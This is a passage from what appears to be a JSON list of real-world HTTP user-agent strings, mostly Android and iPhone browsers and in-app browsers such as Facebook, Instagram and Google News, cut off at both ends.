iOS 16_3_1; tr_TR; tr-TR; scale=2.00; 750x1334; 462123488) NW/3","Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E252 [FBAN/FBIOS;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/16.4.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]","Mozilla/5.0 (Linux; Android 12; 2201116SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.0.0; SM-A600FN Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/373.0.0.31.112;]","AppleCoreMedia/1.0.0.19H307 (iPhone; U; CPU OS 15_7_3 like Mac OS X; sr_cs)","Mozilla/5.0 (Linux; Android 12; V2109 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; moto g(9) plus Build/RPAS31.Q2-59-17-4-5-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-A137F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]","Mozilla/5.0 (Linux; Android 10; W-V851-EEA Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.0.0; SM-J600FN Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 277.1.0.20.110 (iPhone14,5; iOS 16_3_1; tr_TR; tr-TR; scale=3.00; 1170x2532; 462633398)","Mozilla/5.0 (Linux; Android 12; SM-G970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/361.0.0.39.115;]","Mozilla/5.0 (Linux; Android 12; SM-M135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 9S Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-A037G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.72.304","Mozilla/5.0 (Linux; Android 11; SM-A207F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.0.0; LG-H930 Build/OPR1.170623.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","Mozilla/5.0 (Linux; Android 12; M2002J9G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Dalvik/2.1.0 (Linux; U; Android 12; moto g62 5G Build/S1SSS32.53-82-4)","Mozilla/5.0 (Linux; Android 9; ZTE Blade A5 2020 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; ASUS_X00QD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-G965F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-M127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; CPH2021 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.0.0; AGS2-W09 Build/HUAWEIAGS2-W09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; SM-A505FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; C80 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","Mozilla/5.0 (Linux; Android 12; SM-G985F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; Redmi 7A Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; RMX1901 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Infinix X687) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3370 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E252 [FBAN/FBIOS;FBDV/iPhone14,2;FBMD/iPhone;FBSN/iOS;FBSV/16.4.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]","Mozilla/5.0 (Linux; Android 12; Infinix X6815B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E247 [FBAN/FBIOS;FBDV/iPhone15,2;FBMD/iPhone;FBSN/iOS;FBSV/16.4;FBSS/3;FBID/phone;FBLC/ja_JP;FBOP/5]","Mozilla/5.0 (Linux; Android 9; TA-1021 Build/PKQ1.181105.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 11; M2003J15SC Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; 2201117TY Build/RKQ1.211001.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-M336B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.0.0; Moto Z2 Play Build/OPSS27.76-12-25-23) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 8.0.0; FIG-LX1 Build/HUAWEIFIG-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; SM-M205FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.1.0; SM-C710F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) WebKit/8614 (KHTML, like Gecko) Mobile/20D47 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.3;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5]","Mozilla/5.0 (Linux; Android 10; M2006C3MNG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; H8216) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","AppleCoreMedia/1.0.0.19H321 (iPad; U; CPU OS 15_7_4 like Mac OS X; de_de)","Mozilla/5.0 (Linux; U; Android 12; it-it; Mi Note 10 Lite Build/SKQ1.210908.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.25.2-gn","AppleCoreMedia/1.0.0.20L497 (Apple TV; U; CPU OS 16_4 like Mac OS X; cs_cz)","Mozilla/5.0 (Linux; Android 11; M2003J15SC Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; CPH2211 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 9; ASUS_X00TD Build/PKQ1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 9; FIG-LX1 Build/HUAWEIFIG-L11) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 13; SM-G991B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36 OPR/40.0.2207.0 OMI/4.9.0.237.Martell-2.312 Model/Hisense-MT5658-SDK4-9 MT5658 (;Hisense;SmartTV;V0000.01.00a.J0211;HE43A6500UWTS) FXM-U2FsdGVkX18E2h+DGl0Ca3x7cfil1SXl3UvyVm/hNaEZ9Uypf6l8qRSssvBVtWeJ-END","AppleCoreMedia/1.0.0.20E252 (iPad; U; CPU OS 16_4_1 like Mac OS X; hr_hr)","Mozilla/5.0 (Linux; Android 9; KINGKONG_MINI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A405FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A Build/HUAWEIWAS-LX1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 12; moto e22s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Mi A1 Build/PKQ1.180917.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.115 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 12; SM-G973U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; motorola one macro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A032F Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GNews Android/2022113898","Mozilla/5.0 (Linux; Android 11; SM-A326B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 7.0; U PULSE LITE Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-A226B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-A515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; moto g 5G plus Build/RPNS31.Q4U-39-27-9-2-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/349.0.0.8.103;]","Mozilla/5.0 (Linux; Android 12; Nokia G22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-A326B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; 22041219NY Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; M1908C3JGG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus Build/OPM1.171019.019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 12; V2109 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; 5.1.1; KIW-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; HRY-LX1 Build/HONORHRY-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio/25.2.1; iPhone14,4; iOS/16.4.1","Mozilla/5.0 (Linux; Android 12; SM-A908B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; SM-J530G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","TuneIn Radio/25.2.1; iPhone10,6; iOS/16.4.1","AppleCoreMedia/1.0.0.20E252 (iPad; U; CPU OS 16_4_1 like Mac OS X; en_us)","Mozilla/5.0 (Linux; Android 10; SM-A025G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; Mi Note 10 Lite Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.1.0; Moto G (5S) Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; COL-L29 Build/HUAWEICOL-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]","Mozilla/5.0 (Linux; Android 13; SM-G980F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 12; CPH2211 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 8T Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; 6127I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; A100) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 5.1.1; SM-P605 Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Safari/537.36 [FB_IAB/FB4A;FBAV/321.0.0.37.119;]","Mozilla/5.0 (Linux; Android 11; T767H Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-A325M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 UOH/v1.6_284-android","Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; M2012K11AG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; AMN-LX9 Build/HUAWEIAMN-LX9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]","Mozilla/5.0 (Linux; Android 11; M2004J19PI Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; ASUS_Z01QD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; M2003J15SC Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 12; M2007J22G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","[FBAN/FB4A;FBAV/396.0.0.21.104;FBBV/428168139;FBDM/{density=1.3312501,width=800,height=1216};FBLC/en_US;FBRV/429820205;FBCR/;FBMF/Qlink;FBBD/Qlink;FBPN/com.facebook.katana;FBDV/Scepter8;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Herring/96.1.5520.21","Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/402.0.0.11.101;]","Mozilla/5.0 (Linux; Android 13; SM-S901E Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; LG-H930 Build/PKQ1.190414.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 9; MRD-LX1 Build/HUAWEIMRD-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 13; M2102J20SG Build/TKQ1.221013.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 GNews Android/2022108570","Mozilla/5.0 (Linux; Android 10; Mi A2 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; ZTE Blade A52 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022118446","Mozilla/5.0 (Linux; Android 9; FIG-LX1 Build/HUAWEIFIG-L11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Dalvik/2.1.0 (Linux; U; Android 12; S41Pro Build/SP1A.210812.016)","Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","TuneIn Radio Pro/25.2.1; iPhone12,3; iOS/16.4","Mozilla/5.0 (Linux; Android 12; 21061119DG Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 12; motorola edge 20 lite Build/S2RKS32.92-11-21-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-G986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; motorola edge 30 neo Build/S3SSM32.34-131; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; 5028D_EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 GLS/94.10.4049.50","Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.0.0; AGS2-L09 Build/HUAWEIAGS2-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.6.115;]","Mozilla/5.0 (Linux; Android 11; SM-A105FN Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 